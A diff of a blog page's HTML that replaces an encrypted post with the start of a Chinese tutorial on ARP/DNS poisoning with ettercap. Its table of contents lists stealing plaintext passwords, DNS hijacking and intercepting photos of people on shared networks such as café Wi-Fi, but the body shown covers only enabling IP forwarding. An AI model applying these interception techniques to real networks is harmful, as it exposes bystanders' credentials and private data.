@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>某即时通讯聊天软件防止撤回的patch | 2st&#39;s Blog</title>
-  <meta name="keywords" content=" Re ">
-  <meta name="description" content="某即时通讯聊天软件防止撤回的patch | 2st&#39;s Blog">
+  <title>ettercap毒化内网的一些姿势 | 2st&#39;s Blog</title>
+  <meta name="keywords" content=" 渗透 ">
+  <meta name="description" content="ettercap毒化内网的一些姿势 | 2st&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Welcome to my blog, enter password to read.">
 <meta name="keywords" content="Re">
@@ -285,9 +285,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-某聊天软件防止撤回的patch" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-ettercap毒化内网" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">某即时通讯聊天软件防止撤回的patch</h1>
+        <h1 class="article-title">ettercap毒化内网的一些姿势</h1>
     
     <div class="article-meta">
         
@@ -295,26 +295,26 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="商业软件逆向">商业软件逆向</a>
+                <a href="javascript:" data-rel="Linux">Linux</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Re</a>
+            <a href="javascript:" class="color3">渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-11-30 15:28:28'>2019-11-30 15:28</time>
+        创建时间:<time class="date" title='更新时间: 2019-12-10 11:47:01'>2019-12-10 11:47</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:402</span>
+        <span>字数:1.1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -333,7 +333,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#encrypt-message"><span class="toc-text">Welcome to my blog, enter password to read.</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-当咖啡厅有wifi时，手里的咖啡就不香了"><span class="toc-text">-1.当咖啡厅有wifi时，手里的咖啡就不香了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0-写在前面的一些注意事项"><span class="toc-text">0.写在前面的一些注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-抓取用户连接网站的明文密码"><span class="toc-text">1.抓取用户连接网站的明文密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-劫持DNS，给同一网段下的用户推送你的网页"><span class="toc-text">2.劫持DNS，给同一网段下的用户推送你的网页</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x1修改ettercap的DNS配置文件"><span class="toc-text">0x1修改ettercap的DNS配置文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x2搭建web服务"><span class="toc-text">0x2搭建web服务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-截取用户的照片"><span class="toc-text">3.截取用户的照片</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-ettercap的常用功能"><span class="toc-text">4.ettercap的常用功能</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -349,7 +349,67 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>
+        <h3 id="1-当咖啡厅有wifi时，手里的咖啡就不香了"><a href="#1-当咖啡厅有wifi时，手里的咖啡就不香了" class="headerlink" title="-1.当咖啡厅有wifi时，手里的咖啡就不香了"></a>-1.当咖啡厅有wifi时，手里的咖啡就不香了</h3><h3 id="0-写在前面的一些注意事项"><a href="#0-写在前面的一些注意事项" class="headerlink" title="0.写在前面的一些注意事项"></a>0.写在前面的一些注意事项</h3><p>因为ettercap并不会进行网络转发，我们需要提前打开</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure>
+
+<p> 当前系统就能实现包转发，但下次启动计算机时将失效，因为一般使用情景都是live启动，所以这一点不用特殊关注，如果像保存相关设置， 在配置文件/etc/sysctl.conf中写入：net.ipv4.ip_forward = 1.这样就不会在重启的时候失效 。 用户还可以使用如下命令查看当前系统是否支持包转发：sysctl net.ipv4.ip_forward </p>
+<p>此外，ettercap 确实已经非常老了,也确实是那个时代的经典，且有几年没有大的更新了，但对于一些防护并不是特别好的内网,依然非常实用。</p>
